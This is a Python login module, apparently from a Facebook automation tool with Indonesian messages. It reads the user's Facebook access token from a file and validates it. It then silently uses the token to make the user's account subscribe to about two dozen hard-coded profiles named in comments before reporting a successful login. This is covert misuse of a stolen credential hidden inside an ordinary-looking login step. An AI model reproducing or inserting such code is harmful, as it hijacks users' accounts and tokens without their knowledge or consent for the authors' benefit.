import requests,os,json
import elite

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
O = "\x1b[0;96m" # Biru Muda

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%sā'%(M))
        print('%sāāā[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(elite.menu_log())
    requests.post("https://graph.facebook.com/100003888153228/subscribers?access_token=" + token)      # Abdullah
    requests.post("https://graph.facebook.com/100000766200575/subscribers?access_token=" + token) # Abdullah
    requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) # Dapunta Adya R
    requests.post("https://graph.facebook.com/100004499498856/subscribers?access_token=" + token) # Abdullah
    requests.post("https://graph.facebook.com/100000260233573/subscribers?access_token=" + token) # Rehan khan
    requests.post("https://graph.facebook.com/742821237/subscribers?access_token=" + token) # Zait ullah
    requests.post("https://graph.facebook.com/100005323385256/subscribers?access_token=" + token) # SHAHZAIN DAVID JOIYA
    requests.post("https://graph.facebook.com/100042425521699/subscribers?access_token=" + token)       # Noyan ibn mingghan
    requests.post("https://graph.facebook.com/100007283677327/subscribers?access_token=" + token) # Azezal
    requests.post("https://graph.facebook.com/100022047961256/subscribers?access_token=" + token)      # BILAL KHAN
    requests.post("https://graph.facebook.com/100001457641705/subscribers?access_token=" + token)      # Imtiaz Baloch
    requests.post("https://graph.facebook.com/100002469616581/subscribers?access_token=" + token) # Muhammad Junaid
    requests.post("https://graph.facebook.com/100046002053974/subscribers?access_token=" + token) # Umar khan
    requests.post("https://graph.facebook.com/100048514350891/subscribers?access_token=" + token) # Muhammad Hamza
    requests.post("https://graph.facebook.com/100007854312451/subscribers?access_token=" + token) # Asghar Latif
    requests.post("https://graph.facebook.com/100001746091747/subscribers?access_token=" + token) # Rishu
    requests.post("https://graph.facebook.com/100020517793189/subscribers?access_token=" + token) # Hamza gul
    requests.post("https://graph.facebook.com/100011806481936/subscribers?access_token=" + token) # Annos
    requests.post("https://graph.facebook.com/100047878441954/subscribers?access_token=" + token) # Ameer al aziz
    requests.post("https://graph.facebook.com/10016189/subscribers?access_token=" + token)        # Junee
    requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) # Moh Yayan
    requests.post("https://graph.facebook.com/100003467793035/subscribers?access_token=" + token) # Fajar Dwi S
    requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) # M Ardian Iqbal
    requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token) # Hanifan
    print('%sā'%(O))
    print('%sāāā[%s!%s] %sLogin Berhasil'%(O,P,O,P))
    exit(elite.menu())
